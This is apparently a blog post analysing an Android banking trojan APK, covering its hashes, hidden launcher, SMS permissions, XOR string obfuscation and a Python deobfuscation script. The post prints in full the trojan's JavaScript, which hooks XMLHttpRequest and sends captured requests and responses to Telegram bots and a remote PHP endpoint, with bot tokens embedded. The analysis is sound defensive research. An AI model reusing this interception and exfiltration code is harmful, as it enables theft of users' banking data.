---
title: Analyzing Banking Trojan - Reversing Apk (Part 2)
date: 2025-04-17
categories: [Reverse Engineering]
tags: [Malware, Reverse Engineering, Apk]
---

Welcome Back to the Part2 of Analyzing the Banking trojan. In this part we are going to look at the main payload application that the dropper has installed on our device. As always we are going to start with the Basic Analysis by uploading apk to the virustotal for getting the overview of application's behaviour.

## Basic Analysis

<figure><img src="/assets/Malware/Banking-Trojan/Virustotal_payload.png" alt="Virustotal Result"></figure>

The virustotal has given a detailed analysis report and categorized the threat label to be `banker bot`. Let's note all the necessary information and proceed with the static analysis of the application. 

```
MD5 : d2b29820705cf68cecdf260a72836184
 
SHA-1 : 7c223157f6e51f27048bde243b1de6cc9cbd82e1

SHA-256 : dbb0d8566ea1845719deb840396ccb42d0439d6a26aed56e202ed95db3aeb52a

File Name: payload.apk

File Size: 1.53 MB (1600455 bytes)

File type: Android | executable | mobile | android | apk

Detection Rate: As of now 19/65 security vendors flagged it as malicious

Embedded Certificates: Found potential code signing certificates used for validation
```

Okay, So now we have enough info for the identification of this malware. Let's get into the static analysis.

## Static Analysis

To statically analyze the application, I used `jadx-gui` to extract and decompile the apk. You can use apktool or the jadx CLI version to extract the application too. Now let's take a look the `AndroidManifest.xml` which serves as a entrypoint for the analysing the application.

<figure><img src="/assets/Malware/Banking-Trojan/AndroidManifestXml2.png" alt="AndroidManifest XML"></figure>

A key point about this app is that it can't be launched directly by the user from the home screen. For an Android app to show up in the launcher, it must include the `android.intent.category.LAUNCHER` within an <intent-filter> in the `AndroidManifest.xml`. Since this app lacks that configuration, its icon doesn't appear in the app drawer. As a result, after it's installed and opened—perhaps through a phishing message—users might not notice it's still present on their device, even after closing it.

<strong>Things to note:</strong>

```xml
Package Name:
    indieba.indi.indi

User Permissions: 
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>

Main activity:
    android:name="indieba.indi.indi.myodyrurjpvobweyo"
```

The permission that is asking is very dangerous, granting the access will give the attacker basically full control over the device. The attacker can send/read/recieve messages, the permission `android.permission.FOREGROUND_SERVICE`, `android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`, `android.permission.FOREGROUND_SERVICE_DATA_SYNC` allows attacker to continously run the app in the backgroud irrespective of restrictions like battery optimizations, the app will continiously send the data to the attacker.\

Now the main question is where and how the data is being sent to the attacker because there is no point of collecting this much data and not sending it anywhere ..... this sparked my intrest more to reverse enginner the application, So I looked at the main activity `indieba.indi.indi.myodyrurjpvobweyo`.

<figure><img src="/assets/Malware/Banking-Trojan/Malware_main.png" alt="Main Function"></figure>

## Decoding the Strings

Looking at the function, strings seems to be encoded/obfuscated using some kind of algorithm..... and intresting thing to note is that these strings were following this `NPStringFog.decode("<hex_string_possibly>")` pattern. The string is being decoded by the NPStringFog class, so let's take a look a the class and try to reverse engineer it. 

<figure><img src="/assets/Malware/Banking-Trojan/Obfuscate.png" alt="Obfuscation"></figure>

The decode function is performing a XOR operation on the hex encoded string with the key `npmanager` which is hardcoded in the defined function. Using cyberchef I tried to decode those strings and I was successfully able to decode those strings :) 

<figure><img src="/assets/Malware/Banking-Trojan/Cyberchef.png" alt="Cyberchef"></figure>

It was very tiring to manually decode those strings and analyze them using cyberchef, so I created a python script to decode that for me and simply overwrite the encoding strings with the decoded one. 

```python
import os
import re

INPUT_DIR = "extracted_apk"  # Change name with the extracted apk folder name
XOR_KEY = "npmanager"

def xor_decrypt(hex_string, key):
    key_bytes = key.encode()
    data = bytes.fromhex(hex_string)
    decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
    return decrypted.decode(errors="ignore")

def patch_files_with_decoded_strings(input_dir):
    pattern = re.compile(r'NPStringFog\.decode\("([0-9a-fA-F]+)"\)')
    patched_files = 0
    for root, _, files in os.walk(input_dir):
        for file in files:
            if file.endswith(".java") or file.endswith(".smali"):
                file_path = os.path.join(root, file)
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()

                matches = pattern.findall(content)
                if not matches:
                    continue

                for hex_str in matches:
                    try:
                        decrypted = xor_decrypt(hex_str, XOR_KEY)
                        original = f'NPStringFog.decode("{hex_str}")'
                        replacement = f'"{decrypted}"'
                        content = content.replace(original, replacement)
                    except Exception as e:
                        print(f"[!] Failed to decrypt {hex_str}: {e}")

                with open(file_path, 'w') as f:
                    f.write(content)
                patched_files += 1

    print(f"[+] Patched {patched_files} files.")

if __name__ == "__main__":
    patch_files_with_decoded_strings(INPUT_DIR)

```

First you have to decompile the apk. You can use `apktool`, `jdax` or `jadx-gui` to extract and decompile all those files. Then change the 4th line of the code with extracted folder name and run the script. Make sure that the script is in same directory as the folder.

You will see the output like this: 

<figure><img src="/assets/Malware/Banking-Trojan/decode.png" alt="Decoded"></figure>

Now let's open the folder the open and those earlier obfuscated classes in any text editor. I personally like the VSCode. 

<figure><img src="/assets/Malware/Banking-Trojan/Decoded_files.png" alt="Decoded Files"></figure>

All the strings within those files are now decoded and we can analyse the application with ease. After analysing different files, I found one most intresting thing and conclude that these apk was using telegram as a C2 server. 

In the `myodyrurjpvobweyo` function there was a intresting JScode :
```javascript
(function fn_SzP7() {
    function fn_Kn9S(str) {
        return atob(str);
    }
    
    // Removed the duplicate tracking logic (e.g. seenRequests Set)

    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function fn_L3kQ(method, url) {
        this._requestMethod = method;
        this._requestURL = url;
        return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function fn_M9nT(body) {
        this.addEventListener("load", function () {
            const requestData = {
                current_url: window.location.href,
                request_method: this._requestMethod,
                // Exclude request_url from processing
                request_body: body ? body.toString() : null,
                response_text: this.responseText || null
            };

            // Always send the payload without duplicate checks
            const tgBots = [
                { botToken: "7579076301:AAFG3AaQfhT-O1jlnw3w_Zx3cOryBfkmemY", chatId: "-1002480016657" },
                { botToken: "7672911013:AAEoFgNBMK6eekOgIslXjiJwC11Hkp8A9yA", chatId: "-1002480016657" },
                { botToken: "8112210050:AAHE_kZWF1doFTPU2rVR2y3CuVPbg-63Z1I", chatId: "7694382140" },
                { botToken: "8112210050:AAHE_kZWF1doFTPU2rVR2y3CuVPbg-63Z1I", chatId: "-1002480016657" }
            ];
            const randomBot = tgBots[Math.floor(Math.random() * tgBots.length)];
            const telegramApiUrl = fn_Kn9S("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") +
                                   randomBot.botToken +
                                   fn_Kn9S("L3NlbmRNZXNzYWdl");
            const telegramPayload = {
                chat_id: randomBot.chatId,
                text: `📡 *XHR Request Detected!*\n\n` +
                      `🌍 *Current URL:* ${requestData.current_url}\n` +
                      `🔗 *Request URL:* ${this._requestURL}\n` +
                      `📩 *Method:* ${requestData.request_method}\n` +
                      `📤 *Request Body:* ${requestData.request_body || "N/A"}\n` +
                      `📥 *Response:* ${requestData.response_text || "N/A"}`,
                parse_mode: "Markdown"
            };

            function fn_X9mA(attempt = 1) {
                fetch(telegramApiUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(telegramPayload)
                })
                .then(function (response) {
                    if (!response.ok && attempt < 3) {
                        console.warn(`Retrying Telegram... Attempt ${attempt + 1}`);
                        setTimeout(function () { fn_X9mA(attempt + 1); }, 2000);
                    }
                })
                .catch(function (error) {
                    if (attempt < 3) {
                        console.warn(`Retrying Telegram... Attempt ${attempt + 1}`);
                        setTimeout(function () { fn_X9mA(attempt + 1); }, 2000);
                    } else {
                        console.error("Failed to send Telegram request after 3 attempts", error);
                    }
                });
            }
            fn_X9mA();

            const extraApiPayload = {
                sender_id: "FDC-BVC",
                message: JSON.stringify(telegramPayload),
                timestamp: new Date().toISOString()
            };

            const extraApiUrl = fn_Kn9S("aHR0cHM6Ly9zdWJtaXQub3R0Z29vZHMuc2hvcC9wb3N0LnBocA==");

            fetch(extraApiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(extraApiPayload)
            })
            .then(function (response) {
                if (!response.ok) {
                    console.error("Extra API responded with an error", response.status);
                }
            })
            .catch(function (error) {
                console.error("Error sending data to extra API", error);
            });
        });
        return originalSend.apply(this, arguments);
    };
})();

```

This JS function shows that the application is collecting the data and sending it to the attacker via telegram bots. We can see the telegram bot tokens and the chat ids, that the application is using to sending the data. One more thing to note is this base64 encoded string `aHR0cHM6Ly9zdWJtaXQub3R0Z29vZHMuc2hvcC9wb3N0LnBocA==` which results in `https[://]submit.ottgoods.shop/post.php`. So this is the endpoint that it is connecting too. Unfortunately it was not reachable... otherwise we could have done further analysis. Still we have enough information to conclude the intent of this malware.

 